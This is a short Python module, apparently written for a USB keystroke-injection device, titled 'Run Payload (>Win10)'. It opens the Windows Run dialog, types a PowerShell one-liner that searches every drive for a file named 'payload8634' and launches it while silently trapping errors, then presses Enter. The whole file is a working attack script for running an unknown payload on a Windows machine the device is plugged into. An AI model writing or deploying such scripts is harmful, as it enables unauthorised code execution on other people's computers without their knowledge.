from . import *

name = "Run Payload (>Win10)"
def enter():
    kbd.send(Keycode.WINDOWS, Keycode.R)
    sleep(0.1)
    layout.write("""powershell -c "volume|%{saps ($_.driveletter+':\payload8634');trap{}}\"""")
    kbd.send(Keycode.ENTER)